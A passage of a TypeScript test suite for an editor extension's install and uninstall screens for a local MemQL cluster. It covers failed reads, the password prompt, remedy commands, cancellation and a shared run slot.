    assert.equal(cluster.params["pre-existing"], "true", "and the script still knows MemQL did not make it");
    assert.deepEqual(removed, ["memql"], "and the list entry goes with it");
  } finally {
    h.close();
  }
});

test("an unreadable install record is a preview that failed, never 'nothing here'", async () => {
  // THE DEFECT: the preview's read error landed on "No local cluster was
  // found on this computer" with Remove from list -- an offer to drop the
  // entry of a cluster that was still there, because a file could not be
  // parsed. A failed read is shown as a failure.
  const removed: string[] = [];
  const h = await open({
    verdict: "installed-healthy",
    registered: true,
    action: "uninstall",
    receipt: "not a receipt",
    // k3d answering nothing (Docker asleep) is exactly when a swallowed read
    // error would have read as an empty computer.
    listLocalClusters: async () => [],
    removeRegistryEntry: async (name) => void removed.push(name),
  });
  try {
    await until(() => /Couldn't work out what would be removed/.test(h.html()), "the failure");
    const html = h.html();
    assert.doesNotMatch(html, /No local cluster was found|data-act="removeFromList"|data-act="uninstallStart"/);
    assert.deepEqual(barActs(html), ["uninstallBack", "openOutput", "uninstallReload"]);
    // Fixed underneath, Try again reads it again.
    fs.writeFileSync(h.receiptFile, JSON.stringify(fullReceipt()));
    h.post({ type: "uninstallReload" });
    await until(() => /Will be removed/.test(h.html()), "the preview, read again");
    assert.deepEqual(removed, []);
  } finally {
    h.close();
  }
});

test("a list entry with nothing on this computer behind it can be removed from the list", async () => {
  const removed: string[] = [];
  const presence = presenceFor("installed-unreachable", { registered: true, overrides: { readReceiptFile: async () => null } });
  const h = await open({
    presence,
    action: "uninstall",
    listLocalClusters: async () => [],
    removeRegistryEntry: async (name) => void removed.push(name),
  });
  try {
    await until(() => /No local cluster was found/.test(h.html()), "the preview");
    assert.deepEqual(barActs(h.html()), ["uninstallBack", "removeFromList"]);
    h.post({ type: "removeFromList" });
    await until(() => removed.length === 1, "the removal from the list");
    assert.deepEqual(removed, ["memql"]);
  } finally {
    h.close();
  }
});

test("dismissing the password prompt removes nothing, and returns to the preview", async () => {
  // THE DEFECT (high): the uninstall went ahead, deleted the cluster (it needs
  // no root), then failed on the hosts file.
  const h = await openUninstall({ sudoIsFree: async () => false });
  try {
    setNextInputBoxResult(undefined);
    h.post({ type: "uninstallStart" });
    await until(() => recorded.inputBoxes.length === 1, "the prompt");
    await until(() => /Will be removed/.test(h.html()), "the preview again");
    assert.ok(!h.runner.calls.some((c) => c.capability === "install.removeArtifact"), "something was removed");
  } finally {
    h.close();
  }
});

test("an uninstall failure carries the script's remedy, with Run in terminal", async () => {
  // THE DEFECT: the uninstall state never read `result.remedy`, so a hosts
  // file that needed the password got the missing-package advice and no
  // command.
  const remedy = "sudo remove-artifact.sh --kind=hostsEntries --marker=memql";
  const runner = await fakeRunner();
  const inner = runner.run;
  runner.run = async (run) => {
    if (run.capability === "install.removeArtifact" && run.params["kind"] === "hostsEntries") {
      runner.calls.push(run);
      return {
        argv: [run.scriptPath],
        exitCode: 4,
        signal: null,
        stdout: "",
        stderr: "",
        envelope: {
          ok: false,
          capability: "install.removeArtifact",
          changed: false,
          result: { remedy },
          error: { code: 4, message: "couldn't edit /etc/hosts without administrator access" },
        },
      };
    }
    return inner(run);
  };
  const h = await openUninstall({ runner });
  try {
    h.post({ type: "uninstallStart" });
    await until(() => /Couldn't uninstall|Couldn&#39;t uninstall/.test(h.html()), "the failure");
    const html = h.html();
    assert.match(html, /Couldn&#39;t remove local addresses|Couldn't remove local addresses/, "the status, in the negative");
    assert.ok(html.includes(remedy), "the remedy is on the page");
    assert.match(html, /Run the command in a terminal, then retry\./);
    assert.doesNotMatch(html, /\. failed|Install the missing prerequisite/);
    h.post({ type: "remedy", value: "removeHostsBlock" });
    await until(() => recorded.terminals.length === 1, "the terminal");
    assert.deepEqual(recorded.terminals[0]!.sent, [{ text: remedy, executed: false }]);
  } finally {
    h.close();
  }
});

test("Cancel during an uninstall says it is stopping until the step finishes", async () => {
  const runner = await fakeRunner();
  const gate = gateOn(runner, "install.removeArtifact");
  const h = await openUninstall({ runner });
  try {
    h.post({ type: "uninstallStart" });
    await until(gate.reached, "the first removal in flight");
    h.post({ type: "cancel" });
    assert.match(h.html(), /Stopping after the current step/);
    assert.deepEqual(barActs(h.html()), []);
    gate.release();
    await until(() => /data-act="resume"|MemQL is uninstalled/.test(h.html()), "the run to settle");
  } finally {
    gate.release();
    h.close();
  }
});

// -----------------------------------------------------------------------------
// the machine's run slot, shared with the Deployment page
// -----------------------------------------------------------------------------

test("an install is refused while the machine is busy with another run, with Show to it", async () => {
  // A rebuild on the Deployment page and an install here would be two
  // answers to what the machine is. The second is refused in one sentence,
  // and Show brings the running one forward.
  const runs = new LocalRuns();
  let revealed = 0;
  const release = runs.hold({ busy: "rebuilding", reveal: () => (revealed += 1) });
  assert.ok(release !== undefined);
  const h = await open({ runs });
  try {
    await until(() => /Install MemQL on this computer/.test(h.html()), "the landing");
    setNextWarningMessageChoice("Show");
    beginInstall(h);
    await until(() => recorded.warnings.includes("MemQL: The local cluster is busy rebuilding."), "the refusal");
    assert.deepEqual(recorded.warningActions[recorded.warnings.indexOf("MemQL: The local cluster is busy rebuilding.")], ["Show"]);
    await until(() => revealed === 1, "Show to reveal the running one");
    assert.doesNotMatch(h.html(), /Installing MemQL/, "the install started anyway");
    assert.equal(h.runner.calls.some((c) => c.capability === "install.dockerAccess"), false, "a step ran");
  } finally {
    release!();
    h.close();
  }
});

test("an install holds the machine's slot while it runs, and gives it back when it settles", async () => {
  const runs = new LocalRuns();
  const runner = await fakeRunner();
  const gate = gateOn(runner, "install.dockerAccess");
  const h = await open({ runner, runs });
  try {
    beginInstall(h);
    await until(gate.reached, "the install to be running");
    const busy = runs.busy();
    assert.ok(busy !== undefined, "the Deployment page would start a run under this install");
    assert.equal(busy.busy, "installing");
    // The Deployment page's start is refused while it holds it.
    assert.equal(runs.hold({ busy: "rebuilding", reveal: () => undefined }), undefined);
    gate.release();
    await until(() => INSTALLED.test(h.html()), "the run to settle");
    assert.equal(runs.busy(), undefined, "the slot was not given back");
  } finally {
    gate.release();
    h.close();
  }
});
